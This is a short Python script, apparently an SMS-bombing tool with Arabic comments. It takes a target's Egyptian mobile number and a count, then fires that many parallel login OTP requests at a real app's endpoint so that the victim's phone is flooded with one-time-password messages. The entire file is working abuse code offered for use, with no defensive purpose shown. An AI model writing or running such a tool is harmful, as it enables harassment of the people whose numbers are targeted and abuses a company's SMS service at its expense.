#final
import requests
import threading

def get_valid_phone_number():
    while True:
        try:
            phone = input("Phone Number: ")
            if phone.startswith(('010', '011', '012', '015')) and len(phone) == 11:
                return phone
            else:
                print("Error: Invalid phone number. Please try again.")
        except Exception as e:
            print(f"An error occurred while validating phone number: {e}")

def get_request_count():
    while True:
        try:
            count = int(input("Sms Number: "))
            if count > 0:
                return count
            else:
                print("Error: Please enter a positive integer.")
        except ValueError:
            print("Error: Please enter a valid number.")
        except Exception as e:
            print(f"An error occurred while getting request count: {e}")

def send_request(phone, index):
    url = "https://fatura-app.com/auth/otp/send"
    payload = {
        "type": "login",
        "phone": phone,
        "otp": None
    }
    
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            pass  # تنفيذ العملية بدون طباعة الرسالة هنا
    except requests.RequestException as e:
        print(f"An error occurred while sending request: {e}")

def main(phone, count):
    threads = []
    
    for i in range(count):
        thread = threading.Thread(target=send_request, args=(phone, i))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    print("All Sms sent successfully!")  # يتم طباعة الرسالة بعد اكتمال جميع الطلبات

if __name__ == "__main__":
    phone_number = get_valid_phone_number()
    request_count = get_request_count()
    
    main(phone_number, request_count)
